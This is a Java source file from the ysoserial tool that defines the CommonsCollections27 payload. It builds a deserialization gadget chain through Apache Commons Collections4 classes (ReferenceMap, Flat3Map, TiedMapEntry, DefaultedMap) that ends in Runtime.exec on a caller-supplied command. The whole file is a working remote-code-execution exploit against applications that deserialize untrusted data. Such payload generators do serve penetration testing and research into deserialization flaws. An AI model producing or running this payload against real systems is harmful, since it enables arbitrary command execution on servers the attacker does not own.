package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections4.map.*;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.EnumMap;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/*
    Cluster5_20220605-162453, eleventh chain:
        Gadget chain:

			chain_ReferenceMap4-readObject-672224bdae7e38235da3cd937e8fda4ac04e0cd4.txt
				[
			 <org.apache.commons.collections4.map.ReferenceMap: void readObject(java.io.ObjectInputStream)>
			 <org.apache.commons.collections4.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
			 <org.apache.commons.collections4.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
			 <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
			 <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
			 <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
			 <org.apache.commons.collections4.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)>
			 <java.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
			 <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
			 <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
			 <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
			]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections27 extends PayloadRunner implements ObjectPayload<ReferenceMap> {
    enum ProvaEnum {
        zZ,
        yy
    }

    public ReferenceMap getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new org.apache.commons.collections.functors.InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new org.apache.commons.collections.functors.InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};


        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two DefaultedMap with colliding hashes, in order to force element comparison during readObject
        Map defaultedMap1 = DefaultedMap.defaultedMap(innerMap1, (Object) transformerChain);
        defaultedMap1.put("yy", 1);

        Map defaultedMap2 = DefaultedMap.defaultedMap(innerMap2, (Object) transformerChain);
        defaultedMap2.put("zZ", 1);

        ConcurrentHashMap concurrentHashMap1 = new ConcurrentHashMap();
        concurrentHashMap1.put(defaultedMap1, 1);
        ConcurrentHashMap concurrentHashMap2 = new ConcurrentHashMap();
        concurrentHashMap2.put(defaultedMap2, 1);
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(concurrentHashMap1, concurrentHashMap1);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(concurrentHashMap2, concurrentHashMap2);


        Flat3Map flat3map1 = new org.apache.commons.collections4.map.Flat3Map();
        //flat3map1.put(lazyMap1, 1);
        flat3map1.put("yy", tiedMapEntry1);
        //flat3map1.put(flat3map1, 1);

        Flat3Map flat3map2 = new org.apache.commons.collections4.map.Flat3Map();
        //flat3map2.put(lazyMap2, 1);
        flat3map2.put("yy", tiedMapEntry2);
        //flat3map2.put(flat3map2, 2);


        /*EnumMap enumMap2 = new EnumMap(lazyMap1);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(enumMap2, new Object());*/

        // Use the colliding Maps as keys in ReferenceMap
        ReferenceMap referenceMap = new ReferenceMap();
        referenceMap.put(flat3map1, 1);
        referenceMap.put(flat3map2, 2);
        /*LRUMap outputLRUMap = new LRUMap();
        outputLRUMap.put(lazyMap1, 1);
        outputLRUMap.put(lazyMap2, 2);*/

        // arm transformer
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        defaultedMap2.remove("yy");

        return referenceMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections27.class, args);
    }

}
